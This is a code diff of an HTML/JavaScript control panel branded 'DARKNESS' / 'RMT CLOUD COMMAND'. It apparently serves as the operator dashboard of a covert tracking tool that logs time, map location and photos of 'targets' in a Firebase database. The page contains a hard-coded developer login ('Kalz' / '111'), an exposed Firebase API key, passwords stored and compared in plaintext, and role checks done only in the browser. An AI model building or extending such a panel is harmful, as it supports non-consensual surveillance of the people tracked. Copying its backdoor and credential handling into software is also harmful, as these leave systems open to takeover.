@@ -35,10 +35,8 @@
             <button style="background:var(--red); color:#fff; border:none; padding:15px; width:100%; font-weight:bold; margin-top:10px; width:100%; cursor:pointer;" onclick="login()">AUTHORIZE</button>
         </div>
     </div>
-
     <div class="banner">DEVELOPER KALZ | RMT CLOUD COMMAND</div>
     <div class="header"><h1>DARKNESS</h1><div id="uInf" style="font-size:10px; color:#444; margin-top:5px;"></div></div>
-
     <div class="container">
         <div id="t-track" class="section active">
             <table><thead><tr><th>WAKTU</th><th>MAPS</th><th>FOTO</th><th>X</th></tr></thead><tbody id="l-track"></tbody></table>
@@ -53,16 +51,14 @@
         </div>
         <div id="t-supp" class="section">
             <div style="border-left: 3px solid var(--red); padding:15px; background:var(--card);"><p>LEAD: KALZ</p><p>DATABASE: CONNECTED</p></div>
-            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">LOGOUT SESSION</button>
+            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">LOGOUT</button>
         </div>
     </div>
-
     <div class="bottom-nav">
         <button class="nav-btn active" onclick="tab('t-track', this)"><span>🛰️</span>TRACK</button>
         <button id="n-acc" class="nav-btn" onclick="tab('t-acc', this)"><span>👥</span>ACC</button>
         <button class="nav-btn" onclick="tab('t-supp', this)"><span>🛠️</span>SUPP</button>
     </div>
-
 <script>
     const firebaseConfig = {
       apiKey: "AIzaSyAxoDrru0u2zRKYAU3vAE0KBh5ftw1SzaM",
@@ -76,23 +72,20 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     let ses = null;
-
     function login() {
         const u = document.getElementById('uIn').value, p = document.getElementById('pIn').value;
         if(u === "Kalz" && p === "111") { ses = {u: "Kalz", r: "developer"}; enterMarkas(); return; }
         db.ref('users/' + u).once('value', s => {
             const d = s.val();
-            if(d && d.p === p) { ses = {u, r: d.r}; enterMarkas(); } else alert("ACCESS DENIED");
+            if(d && d.p === p) { ses = {u, r: d.r}; enterMarkas(); } else alert("DENIED");
         });
     }
-
     function enterMarkas() {
         document.getElementById('login-screen').style.display = 'none';
         document.getElementById('uInf').innerText = `ACCESS: ${ses.u.toUpperCase()}`;
         if(ses.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
         syncData();
     }
-
     function syncData() {
         db.ref('users').on('value', s => {
             const b = document.getElementById('l-user'); b.innerHTML = '';
@@ -110,22 +103,18 @@
             }
         });
     }
-
     function tab(id, b) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
         document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
         document.getElementById(id).classList.add('active'); b.classList.add('active');
     }
-
     function createAcc() {
         const u = document.getElementById('nu').value, p = document.getElementById('np').value, r = document.getElementById('nr').value;
         if(u && p) db.ref('users/' + u).set({p, r});
     }
-
     function delU(u) { if(confirm("KICK USER?")) db.ref('users/' + u).remove(); }
     function delT(id) { if(confirm("HAPUS LOG?")) db.ref('targets/' + id).remove(); }
     function reqF(img) { const w = window.open(""); w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;"></body>`); }
 </script>
 </body>
 </html>
-.
